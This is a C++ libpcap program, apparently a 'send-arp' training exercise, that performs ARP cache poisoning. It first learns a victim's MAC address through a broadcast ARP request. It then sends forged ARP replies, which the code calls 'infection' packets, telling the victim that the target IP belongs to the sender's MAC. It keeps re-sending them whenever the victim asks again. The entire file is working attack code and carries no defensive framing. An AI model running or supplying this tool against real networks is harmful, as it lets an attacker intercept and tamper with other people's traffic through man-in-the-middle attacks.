#include <pcap.h>
#include <stdio.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/if_arp.h>

#define MAC_LEN 6
#define IP_LEN 4

#pragma pack(push, 1)
typedef  struct _type_eth_arp{
    uint8_t dst_mac[MAC_LEN];
    uint8_t src_mac[MAC_LEN];
    uint16_t type;
    uint16_t HW_type;
    uint16_t Proto_type;
    uint8_t HW_len;
    uint8_t Proto_len;
    uint16_t Opcode;
    uint8_t S_MAC[MAC_LEN];
    in_addr S_IP;
    uint8_t T_MAC[MAC_LEN];
    in_addr T_IP;
} type_eth_arp;
#pragma pack(pop)

void get_my_mac(char* dev,uint8_t *a_mac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; i++)
            a_mac[i]=s.ifr_addr.sa_data[i];
    }
}

void get_my_ip (char * dev,in_addr *a_ip) {
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, dev);
    if (0 == ioctl(sockfd, SIOCGIFADDR, &ifrq))  {
        sin = reinterpret_cast<struct sockaddr_in *>(&ifrq.ifr_addr);
        memcpy (a_ip, reinterpret_cast<void *>(&sin->sin_addr), sizeof(sin->sin_addr));
    }
}

struct _type_eth_arp make_broadcast_packet(uint8_t *s_mac,in_addr s_ip,in_addr t_ip){
    type_eth_arp tmp;
    memcpy(tmp.src_mac,s_mac,MAC_LEN);
    memset(tmp.dst_mac,0xff,MAC_LEN);
    tmp.type = htons(ETHERTYPE_ARP);
    tmp.HW_type = htons(ARPHRD_ETHER);
    tmp.Proto_type = htons(ETHERTYPE_IP);
    tmp.HW_len = MAC_LEN;
    tmp.Proto_len = IP_LEN;
    tmp.Opcode = htons(ARPOP_REQUEST);
    memcpy(tmp.S_MAC,s_mac,MAC_LEN);
    tmp.S_IP = s_ip;
    memset(tmp.T_MAC,0x00,MAC_LEN);
    tmp.T_IP = t_ip;
    return tmp;
}

void make_infection_packet(pcap_t * handle, type_eth_arp *tmp, in_addr fake_ip){
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        pcap_sendpacket(handle,reinterpret_cast<const u_char*>(tmp),sizeof (type_eth_arp));
        type_eth_arp *earp = reinterpret_cast<type_eth_arp *>(const_cast<u_char*>(packet));
        if (ntohs(earp->type) != ETHERTYPE_ARP )
            continue;
        if ((earp->S_IP.s_addr == tmp->T_IP.s_addr) && (earp->T_IP.s_addr == tmp->S_IP.s_addr) && (ntohs(earp->Opcode) == ARPOP_REPLY)){
            memcpy(tmp->dst_mac,earp->S_MAC,MAC_LEN);
            tmp->S_IP = fake_ip;
            memcpy(tmp->T_MAC,earp->S_MAC,MAC_LEN);
            tmp->Opcode = htons(ARPOP_REPLY);
            break;
        }
    }
}

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    uint8_t myMAC[MAC_LEN];
    in_addr myIP, sender_ip, target_ip;
    inet_aton(argv[2],&sender_ip);
    inet_aton(argv[3],&target_ip);
    get_my_mac(dev, myMAC);
    get_my_ip(dev, &myIP);

    type_eth_arp s_b = make_broadcast_packet(myMAC,myIP,sender_ip);
    make_infection_packet(handle,&s_b,target_ip);
    printf("Send arp packet!\n");
    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));
    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        type_eth_arp *earp = reinterpret_cast<type_eth_arp *>(const_cast<u_char *>(packet));
        if(ntohs(earp->type) != ETHERTYPE_ARP)
            continue;
        if((earp->S_IP.s_addr == s_b.T_IP.s_addr) && (earp->T_IP.s_addr == s_b.S_IP.s_addr) && (ntohs(earp->Opcode) == ARPOP_REQUEST)){
            printf("send reply packet");
            pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));
        }
    }
    pcap_close(handle);
}